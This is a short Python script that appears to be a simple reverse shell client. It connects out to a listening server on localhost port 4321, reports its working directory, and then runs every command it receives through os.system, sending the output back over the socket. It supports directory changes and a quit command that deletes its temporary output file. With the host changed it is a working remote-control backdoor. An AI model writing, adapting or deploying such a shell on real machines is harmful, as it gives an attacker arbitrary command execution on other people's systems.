import socket
import os
import json

HOST = 'localhost'
PORT = 4321

path = ''
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.connect((HOST, PORT))
    s.sendall(os.getcwd().encode('utf-8'))
    while True:
        command = s.recv(1024).decode('utf-8')
        if command == '':
            os.system(b'\r')

        if command == 'q':
            print('Disconnected')
            os.system('rm -rf output.txt')
            s.sendall(b'q')
            break

        if command[:2]=='cd' and len(command)>1:
            if command[3:] == '':
                os.chdir(os.path.expanduser('/home/kshitij'))
            else:
                os.chdir(os.path.expanduser(command[3:]))
            s.sendall(os.getcwd().encode('utf-8'))
            continue

        try:
            e = os.system(f'{command} > output.txt')
            if e == 0:
                with open('output.txt', 'r') as f:
                    s.sendall(json.dumps(f.read()).encode('utf-8'))
            else:
                s.sendall(b'Invalid Command')
        except:
            s.sendall(b'Invalid Command')